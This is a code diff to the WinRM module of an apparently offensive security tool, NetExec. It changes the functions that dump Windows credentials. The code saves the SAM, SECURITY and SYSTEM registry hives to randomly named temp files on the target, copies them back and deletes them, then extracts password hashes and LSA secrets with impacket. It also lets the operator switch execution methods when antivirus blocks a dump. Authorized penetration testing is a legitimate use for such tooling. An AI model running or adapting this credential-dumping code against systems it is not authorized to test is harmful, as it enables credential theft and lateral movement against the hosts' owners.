@@ -17,6 +17,7 @@ from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 from nxc.config import process_secret
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.misc import gen_random_string
 from nxc.protocols.ldap.laps import LDAPConnect, LAPSv2Extract
 from nxc.logger import NXCAdapter
 
@@ -347,17 +348,22 @@ class winrm(connection):
         self.execute(payload=self.args.ps_execute, get_output=True, shell_type="powershell")
 
     def sam(self):
+        sam_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\SYSTEM C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
         try:
-            self.execute("cmd /c 'reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM'", False)
-            self.conn.fetch("C:\\aaaaaaaaaaaaaa", self.output_filename + ".sam")
-            self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
-            self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
-            self.execute("cmd /c 'del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM'", False)
+            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
+            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", self.output_filename + ".sam")
+            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", self.output_filename + ".system")
+            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
-            if e in ["does not exist", "TransformFinalBlock"]:
+            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                 self.logger.fail("Failed to dump SAM hashes, maybe got blocked by AV softwares or current user is not privileged user")
+            elif hasattr(e, "code") and e.code == 5:
+                self.logger.fail(f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'")
             else:
-                self.logger.fail(e)
+                self.logger.fail(str(e))
         else:
             local_operations = LocalOperations(f"{self.output_filename}.system")
             boot_key = local_operations.getBootKey()
@@ -371,16 +377,22 @@ class winrm(connection):
             SAM.export(f"{self.output_filename}.sam")
 
     def lsa(self):
+        security_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\SYSTEM C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
         try:
-            self.execute("cmd /c 'reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM'", False)
-            self.conn.fetch("C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security")
-            self.conn.fetch("C:\\windows\\temp\\SYSTEM", f"{self.output_filename}.system")
-            self.execute("cmd /c 'del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY'", False)
+            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
+            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{self.output_filename}.security")
+            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{self.output_filename}.system")
+            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
-            if e in ["does not exist", "TransformFinalBlock"]:
+            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                 self.logger.fail("Failed to dump LSA secrets, maybe got blocked by AV softwares or current user is not privileged user")
+            elif hasattr(e, "code") and e.code == 5:
+                self.logger.fail(f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'")
             else:
-                self.logger.fail(e)
+                self.logger.fail(str(e))
         else:
             local_operations = LocalOperations(f"{self.output_filename}.system")
             boot_key = local_operations.getBootKey()
